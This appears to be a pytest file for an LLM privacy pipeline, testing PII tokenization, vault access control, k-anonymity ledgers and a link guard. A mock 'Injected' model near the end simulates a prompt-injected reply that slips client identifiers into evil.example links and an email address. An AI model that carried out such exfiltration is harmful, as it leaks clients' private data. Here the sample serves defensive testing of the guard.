import pytest

from secure_context.data import load_environment
from secure_context.detect import default_detector, resolve_coreference, score_detection
from secure_context.llm import SimulatedLLM
from secure_context.pipeline import Pipeline
from secure_context.policy import ALL_EXACT, TASKS
from secure_context.privacy import ExposureLedger, KEngine, choose_policy
from secure_context.tokens import Session, dehydrate, rehydrate
from secure_context.vault import AccessDenied, SplitStorage


@pytest.fixture(scope="module")
def env():
    pop, clients = load_environment(n_pop=5000, n_clients=60)
    storage = SplitStorage(default_detector())
    ids = [storage.ingest(c) for c in clients]
    return pop, clients, storage, ids, KEngine(pop)


def test_template_notes_fully_detected(env):
    _, clients, storage, _, _ = env
    for c in clients:
        caught, _, _ = score_detection(c.gold_spans, storage.detector.detect(c.notes, c), len(c.notes))
        assert all(caught), c.notes


def test_dehydrated_notes_hold_no_identifiers(env):
    _, clients, storage, ids, _ = env
    for c, ctx in zip(clients, ids):
        s = Session()
        text = storage.session_notes(ctx, s)
        for v in (c.name, c.ssn, c.email, c.account, c.phone, c.address):
            assert v not in text


def test_round_trip(env):
    _, clients, storage, _, _ = env
    c = clients[0]
    s = Session()
    spans = resolve_coreference(storage.detector.detect(c.notes, c), c)
    r = rehydrate(dehydrate(c.notes, spans, s), s)
    assert not r.unresolved
    assert c.ssn in r.text or c.ssn[-4:] in r.text


def test_tokens_change_across_sessions(env):
    c = env[1][0]
    assert Session().token("PERSON", c.name) != Session().token("PERSON", c.name)


def test_llm_role_cannot_read_vault(env):
    _, _, storage, ids, _ = env
    with pytest.raises(AccessDenied):
        storage.vault.identity(ids[0], role="llm_service")
    with pytest.raises(AccessDenied):
        storage.store.get(ids[0], role="llm_service")


def test_masking_alone_is_unique(env):
    _, clients, _, _, engine = env
    assert sum(engine.k(c, ALL_EXACT) == 1 for c in clients) / len(clients) > 0.9


def test_adaptive_respects_k_min_cumulatively(env):
    _, clients, _, _, engine = env
    ledger = ExposureLedger(engine)
    for c in clients[:20]:
        for task in list(TASKS) * 2:
            best = choose_policy(task, c, engine, 10, ledger)
            if best:
                ledger.record(c, best[0], task)
        assert ledger.k_now(c) >= 10


def test_pipeline_runs_every_mode(env):
    _, clients, storage, ids, engine = env
    for mode in ("full", "masked", "default", "adaptive"):
        p = Pipeline(storage, engine, SimulatedLLM())
        tr = p.run(clients[1], ids[1], "meeting_prep", mode=mode)
        assert tr.refused or clients[1].name in tr.rehydrated
        if mode != "full":
            assert clients[1].name not in tr.prompt


class Injected:
    """Model that obeys a planted instruction: it puts the client token in a link and an email address."""

    def complete(self, system, prompt, session=None, client=None, **_):
        tok = session.token("PERSON", client.name)
        return (f"Brief for {tok}. Details: https://evil.example/c?who={tok} "
                f"and [portal](https://evil.example/{tok[1:-1]}) or mail {tok}@evil.example.com")


def test_link_guard_is_on_in_the_pipeline(env):
    _, clients, storage, ids, engine = env
    c = clients[2]
    tr = Pipeline(storage, engine, Injected()).run(c, ids[2], "meeting_prep", mode="masked")
    assert tr.rehydrated.startswith(f"Brief for {c.name}.")   # tokens in prose are still filled in
    assert tr.rehydrated.count(c.name) == 1                   # but never inside a link or email address
    assert tr.rehydrated.count("link removed") == 3


def test_guard_can_be_disabled_for_measurement():
    s = Session()
    tok = s.token("PERSON", "Ada Lovelace")
    assert "Ada Lovelace" in rehydrate(f"see https://x.example/?q={tok}", s, guard=False).text
    assert "Ada Lovelace" not in rehydrate(f"see https://x.example/?q={tok}", s).text
    assert rehydrate("see https://lpl.example/help", s).text == "see https://lpl.example/help"


def test_household_counts_in_k_when_the_population_records_it(env):
    import pandas as pd
    from secure_context.policy import household_parts
    pop, clients, _, _, _ = env
    c = clients[0]
    marital, n = household_parts(c.household)
    book = pd.DataFrame([dict(pop.loc[x.person_idx]) for x in clients]).reset_index(drop=True)
    book["marital"] = [household_parts(x.household)[0] for x in clients]
    book["dependents"] = [household_parts(x.household)[1] for x in clients]
    from dataclasses import replace
    c0 = replace(c, person_idx=0)
    base = {k: "drop" for k in ALL_EXACT}
    plain, counted = KEngine(book.drop(columns=["marital", "dependents"])), KEngine(book)
    assert plain.k(c0, dict(base, household="exact")) == len(clients)    # no household data: cannot narrow
    k_exact = counted.k(c0, dict(base, household="exact"))
    k_flag = counted.k(c0, dict(base, household="has_dependents"))
    assert k_exact == sum(household_parts(x.household) == (marital, n) for x in clients)
    assert k_flag == sum((household_parts(x.household)[1] > 0) == (n > 0) for x in clients)
    assert k_exact <= k_flag <= len(clients)


def test_ledger_remembers_household(env):
    _, clients, _, _, engine = env
    c = clients[0]
    ledger = ExposureLedger(engine)
    base = {k: "drop" for k in ALL_EXACT}
    ledger.record(c, dict(base, household="exact"), "meeting_prep")
    ledger.record(c, dict(base, household="drop"), "concentration")
    assert ledger.disclosed[c.client_id]["household"] == "exact"
